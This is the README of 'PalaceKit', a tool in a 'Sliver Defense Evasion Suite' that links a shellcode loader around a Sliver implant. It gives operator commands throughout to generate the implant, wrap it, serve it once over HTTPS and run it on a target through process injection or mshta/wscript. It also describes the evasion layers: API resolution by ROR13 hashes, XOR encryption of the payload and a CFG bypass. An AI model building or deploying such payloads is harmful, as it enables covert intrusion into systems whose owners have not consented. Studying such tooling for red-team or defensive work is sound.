# PalaceKit

Free Crystal Palace Kit for Sliver. Part of the **Sliver Defense Evasion Suite**.

Reimplements `crystalpalace.jar` as a native Go COFF linker. Processes the same Crystal Kit spec format (`.spec` files) and produces PIC shellcode from the same C sources. No Java. No license. No crystalpalace.jar.

---

## What Crystal Palace Actually Is

Crystal Palace is a closed-source Java application (`crystalpalace.jar`) that:
1. Parses a `.spec` DSL file describing how to link COFF objects
2. Merges COFF `.o` files, applying relocations
3. Generates the PICO binary (tiny TCG-compiled execution environment)
4. Fills named COFF sections (`dll`, `mask`, `pico`) with runtime data
5. Outputs a final PIC shellcode blob

Crystal Kit provides the C sources (`loader.c`, `services.c`, `pico.c`, etc.) and `.spec` files. Crystal Palace is the linker that turns them into executable shellcode.

**PalaceKit replaces Crystal Palace** with a Go implementation of the same COFF linker and spec evaluator.

---

## What PalaceKit Does

```
Crystal Kit C sources          palacekit build             Final shellcode
                               ┌──────────────┐
 loader/src/unity.c ─────────▶│ COFF parser  │
 (services, pico, hooks,       │ Relocations  │──▶ palace.bin
  mask, spoof, cfg, cleanup,   │ Named sect.  │   (PIC x64 shellcode)
  loader — unity build)        │ Spec DSL     │
                               │ PICO format  │
                               └──────────────┘
         + loader/loader.spec / loader/pico.spec
         + your Sliver shellcode (--shellcode)
```

The Sliver adaptations (vs the original Crystal Kit for Cobalt Strike):
- `go()` decrypts + `NtCreateThreadEx`'s the Sliver shellcode instead of loading a Beacon DLL
- `hooks.c`, `mask.c`, `spoof.c` are no-op stubs (Go runtime incompatibility)
- PICO is a simplified format (two no-op stubs) — no TCG/libtcg needed
- All calls via ROR13 PEB walk (no IAT)

---

## Evasion Stack

| Layer | Technique |
|-------|-----------|
| **No IAT** | ROR13 PEB walk resolves all API at runtime |
| **No RWX** | Alloc RW → decrypt → mark RX before thread creation |
| **XOR at rest** | Sliver shellcode XOR-encrypted in the loader blob |
| **PIC shellcode** | No PE headers, position-independent code |
| **Named sections** | `dll`/`mask`/`pico` sections filled by spec linker |
| **CFG bypass** | `cfg.c` calls `SetProcessValidCallTargets` |

---

## Prerequisites

- **Go 1.21+**: `go version`
- **mingw-w64**: `apt install mingw-w64`

---

## Setup

### 1. Compile the C loader objects and build the CLI

```bash
cd Crystal-Palace-Kit/palacekit
make all
```

Expected output:
```
x86_64-w64-mingw32-gcc ... src/unity.c -o bin/loader.x64.o
x86_64-w64-mingw32-gcc ... src/pico.c  -o bin/pico.x64.o
x86_64-w64-mingw32-gcc ... src/hooks.c -o bin/hooks.x64.o
x86_64-w64-mingw32-gcc ... src/spoof.c -o bin/spoof.x64.o
x86_64-w64-mingw32-gcc ... src/cfg.c   -o bin/cfg.x64.o
x86_64-w64-mingw32-gcc ... src/cleanup.c -o bin/cleanup.x64.o
go build -o palacekit ./cmd/palacekit
```

Or build them separately:
```bash
make loader   # compile C objects only
make cli      # build Go CLI only
```

---

## Usage

### Step 1: Generate a Sliver shellcode

In the Sliver server console:
```
sliver > generate --format shellcode --os windows --arch amd64 --save implant.bin
```

Use `--format shellcode`, not `--format shared`. A DLL would start a second Go runtime inside the host process, causing conflicts.

### Step 2: Wrap with PalaceKit

```bash
./palacekit build \
    --shellcode implant.bin \
    --spec loader/loader.spec \
    --output build/palace.bin
```

Output:
```
[*] Shellcode: 589824 bytes
[+] Loader: 4218 bytes → build/palace.bin
```

The `loader.spec` file instructs the linker to:
1. Merge the COFF unity object (all C sources in one)
2. Generate a 128-byte random XOR mask
3. XOR-encrypt the Sliver shellcode and embed it in the `dll` section
4. Store the mask key in the `mask` section
5. Build and store the PICO blob in the `pico` section
6. Output the assembled PIC shellcode

### Step 3 (one step): Compile + build together

```bash
./palacekit make-loader \
    --shellcode implant.bin \
    --output build/palace.bin
```

This runs `make -C loader/` then `build` in one command.

### Step 4: Serve the payload

```bash
./palacekit serve --payload build/palace.bin --port 8443
```

Starts a one-shot HTTPS server with a randomized URL path. Shuts down 500ms after one download.

### Step 5: Execute on target

Deliver `palace.bin` to the target via any method:
- Process injection into a legitimate process
- Script host exploitation (wscript, mshta, etc.)
- MaskKit wrapping: `maskkit wrap --shellcode build/palace.bin`

When it runs, `go()` at offset 0 executes immediately — no loader stub needed.

---

## Command Reference

### `palacekit build`

Link COFF objects + spec into a shellcode blob.

```
Flags:
  --spec string        path to .spec file (default: loader/loader.spec)
  --shellcode string   Sliver shellcode .bin (required)
  -o, --output string  output path (default: build/palace.bin)
  -v, --verbose        verbose linker output
```

### `palacekit make-loader`

Compile C sources and link in one step.

```
Flags:
  --shellcode string    Sliver shellcode .bin (required)
  -o, --output string   output path (default: build/palace.bin)
  --loader-dir string   source directory (default: loader)
```

### `palacekit gen-hashes`

Print ROR13 hashes for NT/Win32 functions. Use to verify `services.c` constants match your target.

```bash
./palacekit gen-hashes
NtAllocateVirtualMemory      0xD33BCABD
NtProtectVirtualMemory       0x8C394D89
NtCreateThreadEx             0x4D1DEB74
NtWaitForSingleObject        0xAE06C1B2
...
```

### `palacekit serve`

Serve a payload once over self-signed HTTPS.

```
Flags:
  --payload string   palace.bin to serve (required)
  --port int         HTTPS port (default: 8443)
```

### `palacekit xor-wrap`

Manually XOR-encrypt a file (for testing/debugging).

```bash
./palacekit xor-wrap --input implant.bin --output implant.enc
```

---

## How It Works — Technical Detail

### The Spec DSL

`loader/loader.spec` is processed top-to-bottom by PalaceKit's spec evaluator:

```
load "bin/loader.x64.o"        ← parse COFF, merge .text into code region
    make pic +gofirst +optimize ← rotate `go` symbol to offset 0; +optimize is a Crystal Palace hint (no-op in PalaceKit)

dfr "resolve" "ror13"          ← record ROR13 as the resolve strategy (no-op)

generate $MASK 128             ← fill $MASK with 128 random bytes

push $DLL                      ← push Sliver shellcode bytes onto the stack
    xor $MASK                  ← XOR with $MASK
    preplen                    ← prepend uint32 length (RESOURCE format)
    link "dll"                 ← pop → store as the "dll" named section

push $MASK
    preplen
    link "mask"                ← store the raw mask key

run "pico.spec"                ← evaluate pico.spec, push PICO blob
    link "pico"

export                         ← signal end of spec (triggers assembly)
```

### COFF Relocation Handling

The linker uses a two-pass approach: pass 1 collects sections and symbols, pass 2 applies all relocations once final section sizes are known. This correctly resolves cross-section REL32 displacements.

| Type | Description |
|------|-------------|
| `REL32` | PC-relative 32-bit (function calls, RIP-relative data) |
| `REL32_1..5` | Variants with addend |
| `ADDR32/ADDR32NB` | Absolute 32-bit address |
| `ADDR64` | Absolute 64-bit address |
| `ABSOLUTE` | No-op padding |

### Unity Build

All C sources (`services.c`, `pico.c`, `hooks.c`, `mask.c`, `spoof.c`, `cfg.c`, `cleanup.c`, `loader.c`) are compiled into a single COFF object via `unity.c`. This eliminates MinGW's `.refptr`/ADDR64 cross-TU global indirection — which stores absolute runtime addresses and is incompatible with PIC shellcode.

### Magic-Marker Resource Scan

Named sections (`dll`, `mask`, `pico`) are located at runtime by a forward scan for 4-byte magic constants embedded before each section in the assembled blob:

```c
find_resource_by_magic(MAGIC_DLL)   // 0xC001B008
find_resource_by_magic(MAGIC_MASK)  // 0xC001B009
find_resource_by_magic(MAGIC_PICO)  // 0xC001B007
```

### +gofirst Rotation

When `make pic +gofirst` is specified, the linker rotates the merged `.text` region so the `go` symbol lands at byte offset 0 — the shellcode entry point is at the very start of the output blob, no entry stub needed.

---

## File Structure

```
palacekit/
├── cmd/
│   └── palacekit/
│       ├── main.go          # operator CLI
│       └── serve.go         # one-shot HTTPS server
├── internal/
│   ├── coff/
│   │   ├── types.go         # AMD64 COFF constants and structs
│   │   └── parse.go         # COFF binary parser
│   ├── link/
│   │   └── linker.go        # two-pass COFF linker, relocation engine, +gofirst
│   └── spec/
│       └── eval.go          # Crystal Kit spec DSL evaluator
├── loader/
│   ├── src/
│   │   ├── unity.c          # unity build entry (includes all sources)
│   │   ├── loader.h         # RESOURCE struct, magic constants, typedefs
│   │   ├── loader.c         # go(): self-protect, resolve, decrypt SC, NtCreateThreadEx
│   │   ├── services.c       # patch_resolve(), resolve_all(), function pointers
│   │   ├── pico.c           # PicoLoad, PicoGetExport, setup stubs
│   │   ├── hooks.c          # STUB — disabled (Go scheduler incompatibility)
│   │   ├── mask.c           # STUB — disabled (Go goroutine incompatibility)
│   │   ├── spoof.c          # STUB — disabled
│   │   ├── cfg.c            # CFG bypass stub
│   │   └── cleanup.c        # Memory zeroing before free
│   ├── bin/                 # compiled .o files (after make loader)
│   ├── loader.spec          # main Crystal Kit spec
│   ├── pico.spec            # PICO component spec
│   └── Makefile
├── go.mod
├── Makefile
└── README.md
```
